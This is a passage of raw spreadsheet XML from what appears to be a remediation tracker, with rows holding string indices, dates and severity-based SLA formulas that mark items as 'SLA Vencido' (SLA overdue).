      <c r="W62" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X62" s="11"/>
      <c r="Y62" s="11"/>
      <c r="Z62" s="11"/>
      <c r="AA62" s="8">
        <v>43969</v>
      </c>
      <c r="AB62" s="9" t="s">
        <v>295</v>
      </c>
      <c r="AC62" s="9" t="s">
        <v>296</v>
      </c>
      <c r="AD62" s="36"/>
      <c r="AE62" s="4"/>
      <c r="AF62" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG62" s="27"/>
      <c r="AH62" t="str">
        <f>IFERROR(VLOOKUP(H62,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="63" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A63" s="5">
        <v>62</v>
      </c>
      <c r="B63" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C63" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D63" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E63" s="4"/>
      <c r="F63" s="4"/>
      <c r="G63" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H63" s="4"/>
      <c r="I63" s="4"/>
      <c r="J63" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K63" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L63" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M63" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N63" s="4"/>
      <c r="O63" s="6"/>
      <c r="P63" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q63" s="6"/>
      <c r="R63" s="4">
        <v>500</v>
      </c>
      <c r="S63" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T63" s="8">
        <v>43812</v>
      </c>
      <c r="U63" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V63" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W63" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X63" s="11"/>
      <c r="Y63" s="11"/>
      <c r="Z63" s="11"/>
      <c r="AA63" s="8"/>
      <c r="AB63" s="9" t="s">
        <v>298</v>
      </c>
      <c r="AC63" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD63" s="36"/>
      <c r="AE63" s="4"/>
      <c r="AF63" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG63" s="27"/>
      <c r="AH63" t="str">
        <f>IFERROR(VLOOKUP(H63,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="64" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A64" s="5">
        <v>63</v>
      </c>
      <c r="B64" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C64" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D64" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E64" s="4"/>
      <c r="F64" s="4"/>
      <c r="G64" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H64" s="4"/>
      <c r="I64" s="4"/>
      <c r="J64" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K64" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L64" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M64" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N64" s="4"/>
      <c r="O64" s="6"/>
      <c r="P64" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q64" s="6"/>
      <c r="R64" s="4">
        <v>500</v>
      </c>
      <c r="S64" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T64" s="8">
        <v>43812</v>
      </c>
      <c r="U64" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V64" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W64" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X64" s="11"/>
      <c r="Y64" s="11"/>
      <c r="Z64" s="11"/>
      <c r="AA64" s="8"/>
      <c r="AB64" s="9" t="s">
        <v>300</v>
      </c>
      <c r="AC64" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD64" s="36"/>
      <c r="AE64" s="4"/>
      <c r="AF64" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG64" s="27"/>
      <c r="AH64" t="str">
        <f>IFERROR(VLOOKUP(H64,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="65" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A65" s="5">
        <v>64</v>
      </c>
      <c r="B65" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C65" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D65" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E65" s="4"/>
      <c r="F65" s="4"/>
      <c r="G65" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H65" s="4"/>
      <c r="I65" s="4"/>
      <c r="J65" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K65" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L65" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M65" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N65" s="4"/>
      <c r="O65" s="6"/>
      <c r="P65" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q65" s="6"/>
      <c r="R65" s="4">
        <v>500</v>
      </c>
      <c r="S65" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T65" s="8">
        <v>43812</v>
      </c>
      <c r="U65" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V65" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W65" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X65" s="11"/>
      <c r="Y65" s="11"/>
      <c r="Z65" s="11"/>
      <c r="AA65" s="8">
        <v>43969</v>
      </c>
      <c r="AB65" s="9" t="s">
        <v>301</v>
      </c>
      <c r="AC65" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD65" s="36"/>
      <c r="AE65" s="4"/>
      <c r="AF65" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG65" s="27"/>
      <c r="AH65" t="str">
        <f>IFERROR(VLOOKUP(H65,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="66" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A66" s="5">
        <v>65</v>
      </c>
      <c r="B66" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C66" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D66" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E66" s="4"/>
      <c r="F66" s="4"/>
      <c r="G66" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H66" s="4"/>
      <c r="I66" s="4"/>
      <c r="J66" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K66" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L66" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M66" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N66" s="4"/>
      <c r="O66" s="6"/>
      <c r="P66" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q66" s="6"/>
      <c r="R66" s="4">
        <v>500</v>
      </c>
      <c r="S66" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T66" s="8">
        <v>43812</v>
      </c>
      <c r="U66" s="11">
        <f t="shared" ref="U66:U129" ca="1" si="3">TODAY()-T66</f>
        <v>2397</v>
      </c>
      <c r="V66" s="8">
        <f t="shared" ref="V66:V129" si="4">IF(M66="Critical",T66+10,IF(M66="High",T66+30,IF(M66="Bad",T66+30,IF(M66="Medium",T66+90,IF(M66="Warm",T66+90,IF(M66="Low",T66+120,IF(M66="Fair",T66+120,IF(M66="Neutral",T66+120,""))))))))</f>
        <v>43902</v>
      </c>
      <c r="W66" s="12" t="str">
        <f t="shared" ref="W66:W129" ca="1" si="5">IF(M66="Critical",IF(U66&gt;10,"SLA Vencido","En SLA"),IF(M66="High",IF(U66&gt;30,"SLA Vencido","En SLA"),IF(M66="Bad",IF(U66&gt;30,"SLA Vencido","En SLA"),IF(M66="Medium",IF(U66&gt;90,"SLA Vencido","En SLA"),IF(M66="Warm",IF(U66&gt;90,"SLA Vencido","En SLA"),IF(M66="Low",IF(U66&gt;120,"SLA Vencido","En SLA"),IF(M66="Fair",IF(U66&gt;120,"SLA Vencido","En SLA"),IF(M66="Neutral",IF(U66&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X66" s="11"/>
      <c r="Y66" s="11"/>
      <c r="Z66" s="11"/>
      <c r="AA66" s="8">
        <v>43969</v>
      </c>
      <c r="AB66" s="9" t="s">
        <v>302</v>
      </c>
      <c r="AC66" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD66" s="36"/>
      <c r="AE66" s="4"/>
      <c r="AF66" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG66" s="27"/>
      <c r="AH66" t="str">
        <f>IFERROR(VLOOKUP(H66,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="67" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A67" s="5">
        <v>66</v>
      </c>
      <c r="B67" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C67" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D67" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E67" s="4"/>
      <c r="F67" s="4"/>
      <c r="G67" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H67" s="4"/>
      <c r="I67" s="4"/>
      <c r="J67" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K67" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L67" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M67" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N67" s="4"/>
      <c r="O67" s="6"/>
      <c r="P67" s="6" t="s">
        <v>305</v>
      </c>
      <c r="Q67" s="6"/>
      <c r="R67" s="4">
        <v>500</v>
      </c>
      <c r="S67" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T67" s="8">
        <v>43812</v>
      </c>
      <c r="U67" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V67" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W67" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X67" s="11"/>
      <c r="Y67" s="11"/>
      <c r="Z67" s="11"/>
      <c r="AA67" s="8">
        <v>43969</v>
      </c>
      <c r="AB67" s="9"/>
      <c r="AC67" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD67" s="36"/>
      <c r="AE67" s="4"/>
      <c r="AF67" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG67" s="27"/>
      <c r="AH67" t="str">
        <f>IFERROR(VLOOKUP(H67,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="68" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A68" s="5">
        <v>67</v>
      </c>
      <c r="B68" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C68" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D68" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E68" s="4"/>
      <c r="F68" s="4"/>
      <c r="G68" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H68" s="4"/>
      <c r="I68" s="4"/>
      <c r="J68" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K68" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L68" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M68" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N68" s="4"/>
      <c r="O68" s="6"/>
      <c r="P68" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q68" s="6"/>
      <c r="R68" s="4">
        <v>500</v>
      </c>
      <c r="S68" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T68" s="8">
        <v>43812</v>
      </c>
      <c r="U68" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V68" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W68" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X68" s="11"/>
      <c r="Y68" s="11"/>
      <c r="Z68" s="11"/>
      <c r="AA68" s="8"/>
      <c r="AB68" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC68" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD68" s="36"/>
      <c r="AE68" s="4"/>
      <c r="AF68" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG68" s="27"/>
      <c r="AH68" t="str">
        <f>IFERROR(VLOOKUP(H68,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="69" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A69" s="5">
        <v>68</v>
      </c>
      <c r="B69" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C69" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D69" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E69" s="4"/>
      <c r="F69" s="4"/>
      <c r="G69" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H69" s="4"/>
      <c r="I69" s="4"/>
      <c r="J69" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K69" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L69" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M69" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N69" s="4"/>
      <c r="O69" s="6"/>
      <c r="P69" s="6" t="s">
        <v>286</v>
      </c>
      <c r="Q69" s="6"/>
      <c r="R69" s="4">
        <v>500</v>
      </c>
      <c r="S69" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T69" s="8">
        <v>43812</v>
      </c>
      <c r="U69" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V69" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W69" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X69" s="11"/>
      <c r="Y69" s="11"/>
      <c r="Z69" s="11"/>
      <c r="AA69" s="8">
        <v>43969</v>
      </c>
      <c r="AB69" s="9"/>
      <c r="AC69" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD69" s="36"/>
      <c r="AE69" s="4"/>
      <c r="AF69" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG69" s="27"/>
      <c r="AH69" t="str">
        <f>IFERROR(VLOOKUP(H69,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="70" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A70" s="5">
        <v>69</v>
      </c>
      <c r="B70" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C70" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D70" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E70" s="4"/>
      <c r="F70" s="4"/>
      <c r="G70" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H70" s="4"/>
      <c r="I70" s="4"/>
      <c r="J70" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K70" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L70" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M70" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N70" s="4"/>
      <c r="O70" s="6"/>
      <c r="P70" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q70" s="6"/>
      <c r="R70" s="4">
        <v>500</v>
      </c>
      <c r="S70" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T70" s="8">
        <v>43812</v>
      </c>
      <c r="U70" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V70" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W70" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X70" s="11"/>
      <c r="Y70" s="11"/>
      <c r="Z70" s="11"/>
      <c r="AA70" s="8"/>
      <c r="AB70" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC70" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD70" s="36"/>
      <c r="AE70" s="4"/>
      <c r="AF70" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG70" s="27"/>
      <c r="AH70" t="str">
        <f>IFERROR(VLOOKUP(H70,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="71" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A71" s="5">
        <v>70</v>
      </c>
      <c r="B71" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C71" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D71" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E71" s="4"/>
      <c r="F71" s="4"/>
      <c r="G71" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H71" s="4"/>
      <c r="I71" s="4"/>
      <c r="J71" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K71" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L71" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M71" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N71" s="4"/>
      <c r="O71" s="6"/>
      <c r="P71" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q71" s="6"/>
      <c r="R71" s="4">
        <v>500</v>
      </c>
      <c r="S71" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T71" s="8">
        <v>43812</v>
      </c>
      <c r="U71" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V71" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W71" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X71" s="11"/>
      <c r="Y71" s="11"/>
      <c r="Z71" s="11"/>
      <c r="AA71" s="8">
        <v>43969</v>
      </c>
      <c r="AB71" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC71" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD71" s="36"/>
      <c r="AE71" s="4"/>
      <c r="AF71" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG71" s="27"/>
      <c r="AH71" t="str">
        <f>IFERROR(VLOOKUP(H71,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="72" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A72" s="5">
        <v>71</v>
      </c>
      <c r="B72" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C72" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D72" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E72" s="4"/>
      <c r="F72" s="4"/>
      <c r="G72" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H72" s="4"/>
      <c r="I72" s="4"/>
      <c r="J72" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K72" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L72" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M72" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N72" s="4"/>
      <c r="O72" s="6"/>
      <c r="P72" s="6" t="s">
        <v>282</v>
      </c>
      <c r="Q72" s="6"/>
      <c r="R72" s="4">
        <v>500</v>
      </c>
      <c r="S72" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T72" s="8">
        <v>43812</v>
      </c>
      <c r="U72" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V72" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W72" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X72" s="11"/>
      <c r="Y72" s="11"/>
      <c r="Z72" s="11"/>
      <c r="AA72" s="8">
        <v>43969</v>
      </c>
      <c r="AB72" s="9"/>
      <c r="AC72" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD72" s="36"/>
      <c r="AE72" s="4"/>
      <c r="AF72" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG72" s="27"/>
      <c r="AH72" t="str">
        <f>IFERROR(VLOOKUP(H72,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="73" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A73" s="5">
        <v>72</v>
      </c>
      <c r="B73" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C73" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D73" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E73" s="4"/>
      <c r="F73" s="4"/>
      <c r="G73" s="4" t="s">
        <v>252</v>
      </c>
      <c r="H73" s="4"/>
      <c r="I73" s="4"/>
      <c r="J73" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K73" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L73" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M73" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N73" s="4"/>
      <c r="O73" s="6"/>
      <c r="P73" s="6" t="s">
        <v>253</v>
      </c>
      <c r="Q73" s="6"/>
      <c r="R73" s="4">
        <v>500</v>
      </c>
      <c r="S73" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T73" s="8">
        <v>43812</v>
      </c>
      <c r="U73" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V73" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W73" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X73" s="11"/>
      <c r="Y73" s="11"/>
      <c r="Z73" s="11"/>
      <c r="AA73" s="8"/>
      <c r="AB73" s="9" t="s">
        <v>307</v>
      </c>
      <c r="AC73" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD73" s="36"/>
      <c r="AE73" s="4"/>
      <c r="AF73" s="9" t="s">
        <v>308</v>
      </c>
      <c r="AG73" s="27"/>
      <c r="AH73" t="str">
        <f>IFERROR(VLOOKUP(H73,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="74" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A74" s="5">
        <v>73</v>
      </c>
      <c r="B74" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C74" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D74" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E74" s="4"/>
      <c r="F74" s="4"/>
      <c r="G74" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H74" s="4"/>
      <c r="I74" s="4"/>
      <c r="J74" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K74" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L74" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M74" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N74" s="4"/>
      <c r="O74" s="6"/>
      <c r="P74" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q74" s="6"/>
      <c r="R74" s="4">
        <v>500</v>
      </c>
      <c r="S74" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T74" s="8">
        <v>43812</v>
      </c>
      <c r="U74" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V74" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W74" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X74" s="11"/>
      <c r="Y74" s="11"/>
      <c r="Z74" s="11"/>
      <c r="AA74" s="8">
        <v>43969</v>
      </c>
      <c r="AB74" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC74" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD74" s="36"/>
      <c r="AE74" s="4"/>
      <c r="AF74" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG74" s="27"/>
      <c r="AH74" t="str">
        <f>IFERROR(VLOOKUP(H74,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="75" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A75" s="5">
        <v>74</v>
      </c>
      <c r="B75" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C75" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D75" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E75" s="4"/>
      <c r="F75" s="4"/>
      <c r="G75" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H75" s="4"/>
      <c r="I75" s="4"/>
      <c r="J75" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K75" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L75" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M75" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N75" s="4"/>
      <c r="O75" s="6"/>
      <c r="P75" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q75" s="6"/>
      <c r="R75" s="4"/>
      <c r="S75" s="22"/>
      <c r="T75" s="8">
        <v>43812</v>
      </c>
      <c r="U75" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V75" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W75" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X75" s="11"/>
      <c r="Y75" s="11"/>
      <c r="Z75" s="11"/>
      <c r="AA75" s="8">
        <v>43969</v>
      </c>
      <c r="AB75" s="9" t="s">
        <v>310</v>
      </c>
      <c r="AC75" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD75" s="36"/>
      <c r="AE75" s="4"/>
      <c r="AF75" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG75" s="27"/>
      <c r="AH75" t="str">
        <f>IFERROR(VLOOKUP(H75,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="76" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A76" s="5">
        <v>75</v>
      </c>
      <c r="B76" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C76" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D76" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E76" s="4"/>
      <c r="F76" s="4"/>
      <c r="G76" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H76" s="4"/>
      <c r="I76" s="4"/>
      <c r="J76" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K76" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L76" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M76" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N76" s="4"/>
      <c r="O76" s="6"/>
      <c r="P76" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q76" s="6"/>
      <c r="R76" s="4"/>
      <c r="S76" s="22"/>
      <c r="T76" s="8">
        <v>43812</v>
      </c>
      <c r="U76" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V76" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W76" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X76" s="11"/>
      <c r="Y76" s="11"/>
      <c r="Z76" s="11"/>
      <c r="AA76" s="8">
        <v>43969</v>
      </c>
      <c r="AB76" s="9" t="s">
        <v>312</v>
      </c>
      <c r="AC76" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD76" s="36"/>
      <c r="AE76" s="4"/>
      <c r="AF76" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG76" s="27"/>
      <c r="AH76" t="str">
        <f>IFERROR(VLOOKUP(H76,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="77" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A77" s="5">
        <v>76</v>
      </c>
      <c r="B77" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C77" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D77" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E77" s="4"/>
      <c r="F77" s="4"/>
      <c r="G77" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H77" s="4"/>
      <c r="I77" s="4"/>
      <c r="J77" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K77" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L77" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M77" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N77" s="4"/>
      <c r="O77" s="6"/>
      <c r="P77" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q77" s="6"/>
      <c r="R77" s="4"/>
      <c r="S77" s="22"/>
      <c r="T77" s="8">
        <v>43812</v>
      </c>
      <c r="U77" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V77" s="8">
